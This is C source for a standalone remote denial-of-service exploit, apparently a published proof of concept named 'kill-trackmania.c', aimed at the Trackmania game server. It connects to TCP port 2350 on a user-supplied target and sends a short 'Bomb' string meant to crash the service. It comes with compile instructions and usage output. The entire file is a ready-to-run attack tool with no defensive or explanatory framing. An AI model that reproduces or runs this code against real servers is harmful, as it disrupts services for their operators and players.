/*
* [kill-trackmania.c]
* A remote DoS that affects the Trackmania game server
*
* by Scrap
* webmaster@securiteinfo.com
* http://www.securiteinfo.com
*
* gcc kill-trackmania.c -o kill-trackmania -O2
*
*/

#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>

int main(int argc, char *argv[])
{
int sock;
struct sockaddr_in sin;
struct hostent *he;
unsigned long start;
char buffer[1024];
unsigned long counter;

printf("\n [kill-trackmania.c] by Scrap / Securiteinfo.com\n");

if (argc<2)

{
printf("Usage: %s target\n\n",argv[0]);
exit(0);
}

if ((he=gethostbyname(argv[1])) == NULL)
{
herror("gethostbyname");
exit(0);
}

start=inet_addr(argv[1]);
counter=ntohl(start);

sock=socket(AF_INET, SOCK_STREAM, 0);
bcopy(he->h_addr, (char *)&sin.sin_addr, he->h_length);
sin.sin_family=AF_INET;
sin.sin_port=htons(2350);

if (connect(sock, (struct sockaddr*)&sin, sizeof(sin))!=0)
{
perror("connect");
exit(0);
}
printf("\n\t Sending Bomb... \n");
send(sock, "Bomb from Securiteinfo.com\n\n",17,0);
close(sock);

printf("\t Bomb sent...\n");

}